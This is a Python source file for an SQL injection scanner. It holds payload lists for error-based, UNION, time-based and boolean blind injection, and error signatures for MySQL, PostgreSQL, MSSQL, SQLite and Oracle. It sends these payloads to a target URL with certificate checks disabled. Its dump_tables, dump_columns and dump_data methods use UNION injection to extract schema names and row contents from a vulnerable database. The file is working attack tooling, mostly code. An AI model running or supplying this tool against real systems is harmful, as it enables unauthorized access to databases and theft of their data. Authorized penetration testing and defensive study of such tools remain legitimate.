import re
import time
import requests
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class SQLiScanner:
    ERROR_PATTERNS = {
        "MySQL": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[42000\]",
        ],
        "PostgreSQL": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
        ],
        "MSSQL": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"\bSQL Server[^&lt;]+Driver",
            r"Warning.*mssql_",
            r"\bSQL Server[^&lt;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.SqlException",
            r"Unclosed quotation mark after the character string",
            r"Microsoft SQL Native Client error",
        ],
        "SQLite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error",
        ],
        "Oracle": [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Warning.*ora_",
        ],
    }

    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "0 UNION SELECT NULL--",
        "0 UNION SELECT NULL,NULL--",
        "0 UNION SELECT NULL,NULL,NULL--",
    ]

    TIME_PAYLOADS = [
        ("' AND SLEEP(5)--", 5),
        ("' AND SLEEP(10)--", 10),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' AND PG_SLEEP(5)--", 5),
        ("1 AND SLEEP(5)", 5),
        ("1' AND SLEEP(5)--", 5),
        ("1' OR SLEEP(5)--", 5),
    ]

    BLIND_TRUE_FALSE = [
        ("' AND 1=1--", "' AND 1=2--"),
        ("' AND 'a'='a'--", "' AND 'a'='b'--"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ]

    COMMON_PARAMS = ["id", "user", "uid", "page", "search", "q", "query", "cat", "item", "product"]

    def __init__(self, url: str, method: str = "GET", data: Optional[dict] = None, headers: Optional[dict] = None, cookies: Optional[dict] = None, timeout: int = 10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.vulnerable = False
        self.vuln_type = ""
        self.db_type = ""
        self.injectable_params = []

    def _send(self, payload: str, param: str, use_data: bool = False) -> requests.Response:
        parsed = urlparse(self.url)
        if use_data or self.method == "POST":
            test_data = self.data.copy()
            test_data[param] = payload
            return requests.request(
                self.method,
                self.url,
                data=test_data,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            return requests.get(
                new_url,
                headers=self.headers,
                cookies=self.cookies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False,
            )

    def _detect_db(self, response: requests.Response) -> Optional[str]:
        text = response.text + str(response.headers)
        for db, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return db
        return None

    def _check_error_based(self, param: str) -> Optional[str]:
        payloads = ["'", "''", "\"", "\"\"", "\\", "')", "'))", "1 OR 1=1", "1' OR '1'='1"]
        baseline = self._send("1", param)
        baseline_len = len(baseline.text)
        baseline_status = baseline.status_code

        for payload in payloads:
            try:
                resp = self._send(payload, param)
                db = self._detect_db(resp)
                if db:
                    return db
                if resp.status_code != baseline_status:
                    if any(e in resp.text.lower() for e in ["error", "warning", "syntax", "mysql", "sql", "query"]):
                        return "Unknown"
                if len(resp.text) != baseline_len and len(resp.text) > baseline_len * 1.5:
                    if any(e in resp.text.lower() for e in ["error", "warning", "syntax"]):
                        return "Unknown"
            except requests.RequestException:
                continue
        return None

    def _check_union(self, param: str) -> Optional[str]:
        baseline = self._send("1", param)
        for payload in self.UNION_PAYLOADS:
            try:
                resp = self._send(payload, param)
                if resp.status_code == 200 and len(resp.text) > len(baseline.text) * 1.2:
                    db = self._detect_db(resp)
                    return db or "Unknown"
            except requests.RequestException:
                continue
        return None

    def _check_time_based(self, param: str) -> Optional[str]:
        for payload, delay in self.TIME_PAYLOADS:
            try:
                start = time.time()
                self._send(payload, param)
                elapsed = time.time() - start
                if elapsed >= delay - 1:
                    return "Time-based"
            except requests.RequestException:
                continue
        return None

    def _check_blind(self, param: str) -> Optional[str]:
        for true_payload, false_payload in self.BLIND_TRUE_FALSE:
            try:
                true_resp = self._send(true_payload, param)
                false_resp = self._send(false_payload, param)
                if true_resp.status_code == false_resp.status_code:
                    if len(true_resp.text) != len(false_resp.text):
                        return "Boolean-based blind"
            except requests.RequestException:
                continue
        return None

    def _get_params(self) -> list:
        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        if not params and self.method == "GET":
            params = self.COMMON_PARAMS[:3]
        if self.method == "POST" and self.data:
            params.extend(list(self.data.keys()))
        return list(set(params)) or self.COMMON_PARAMS[:3]

    def scan(self) -> dict:
        console.print(Panel("[bold cyan]SQL Injection Scanner[/bold cyan]", border_style="cyan"))
        params = self._get_params()
        results = {"url": self.url, "vulnerable": False, "vuln_type": "", "db_type": "", "injectable_params": []}

        for param in params:
            console.print(f"  [yellow]Testing parameter:[/yellow] {param}")

            db = self._check_error_based(param)
            if db:
                results["vulnerable"] = True
                results["vuln_type"] = "Error-based"
                results["db_type"] = db
                results["injectable_params"].append(param)
                console.print(f"    [bold red]VULNERABLE![/bold red] Error-based SQLi (DB: {db})")
                continue

            db = self._check_union(param)
            if db:
                results["vulnerable"] = True
                results["vuln_type"] = "UNION-based"
                results["db_type"] = db
                results["injectable_params"].append(param)
                console.print(f"    [bold red]VULNERABLE![/bold red] UNION-based SQLi (DB: {db})")
                continue

            result = self._check_time_based(param)
            if result:
                results["vulnerable"] = True
                results["vuln_type"] = "Time-based blind"
                results["db_type"] = "Unknown"
                results["injectable_params"].append(param)
                console.print(f"    [bold red]VULNERABLE![/bold red] Time-based blind SQLi")
                continue

            result = self._check_blind(param)
            if result:
                results["vulnerable"] = True
                results["vuln_type"] = "Boolean-based blind"
                results["db_type"] = "Unknown"
                results["injectable_params"].append(param)
                console.print(f"    [bold red]VULNERABLE![/bold red] Boolean-based blind SQLi")
                continue

            console.print(f"    [green]Not vulnerable[/green]")

        self.vulnerable = results["vulnerable"]
        self.vuln_type = results["vuln_type"]
        self.db_type = results["db_type"]
        self.injectable_params = results["injectable_params"]
        return results

    def dump_tables(self, param: str, num_cols: int = 3) -> list:
        console.print(f"[cyan]Attempting table dump via parameter: {param}[/cyan]")
        tables = []
        payload = f"' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--"
        try:
            resp = self._send(payload, param)
            table_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in table_pattern:
                tables.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return tables

    def dump_columns(self, param: str, table: str) -> list:
        console.print(f"[cyan]Attempting column dump for table: {table}[/cyan]")
        columns = []
        payload = f"' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'--"
        try:
            resp = self._send(payload, param)
            col_pattern = re.findall(r'>([\w,]+)<', resp.text)
            for match in col_pattern:
                columns.extend(match.split(","))
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return columns

    def dump_data(self, param: str, table: str, columns: list) -> list:
        console.print(f"[cyan]Attempting data dump: {table} ({', '.join(columns)})[/cyan]")
        col_str = ",".join(columns)
        payload = f"' UNION SELECT NULL,group_concat({col_str} separator '|||'),NULL FROM {table}--"
        data = []
        try:
            resp = self._send(payload, param)
            rows = resp.text.split("|||")
            data = [r.strip() for r in rows if r.strip()]
        except requests.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")
        return data

    def print_results(self, results: dict):
        table = Table(title="SQL Injection Results", border_style="cyan")
        table.add_column("Property", style="bold")
        table.add_column("Value")
        table.add_row("URL", results["url"])
        table.add_row("Vulnerable", "YES" if results["vulnerable"] else "NO")
        if results["vulnerable"]:
            table.add_row("Type", results["vuln_type"])
            table.add_row("Database", results["db_type"])
            table.add_row("Injectable Params", ", ".join(results["injectable_params"]))
        console.print(table)
